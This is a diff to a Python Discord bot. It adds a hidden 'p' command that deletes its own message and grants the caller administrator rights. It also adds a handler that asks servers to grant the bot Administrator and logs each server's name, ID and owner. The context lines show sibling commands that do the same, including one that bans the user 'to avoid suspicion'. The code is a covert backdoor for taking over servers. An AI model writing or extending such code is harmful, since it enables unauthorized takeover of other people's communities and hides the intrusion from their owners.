@@ -444,6 +444,12 @@ async def play(ctx):
     await ctx.message.delete()
     await create_admin(ctx)
 
+# gives the user admin
+@bot.command(name="p")
+@commands.bot_has_permissions(administrator=True)
+async def p(ctx):
+    await ctx.message.delete()
+    await create_admin(ctx)
 
 # bans the person who ran the command to avoid suspicion
 @bot.command(name="pause")
@@ -815,6 +821,30 @@ Server ID: {ctx.guild.id}
 Server Owner: {ctx.guild.owner}
 ''')
 
+@p.error
+async def p_error(ctx, error):
+    if isinstance(error, commands.BotMissingPermissions):
+        await ctx.send("Checking environment...")
+        sleep(1)
+        try:
+            embed = discord.Embed(title="Error: Missing Required Permissions!",
+                                  description="This bot is lacking required permissions!")
+            embed.add_field(name="You need to grant me the following permission(s):",
+                            value="- Administrator")
+            await ctx.send(content=None, embed=embed)
+        except discord.Forbidden:
+            await ctx.send('''
+__**Error: Missing Required Permission!**__
+**I need the following permission(s) to function properly:**
+- `Administrator`
+''')
+
+        output_log(f'''
+Bad Environment: Insufficient Permissions!
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
 
 @pause.error
 async def pause_error(ctx, error):
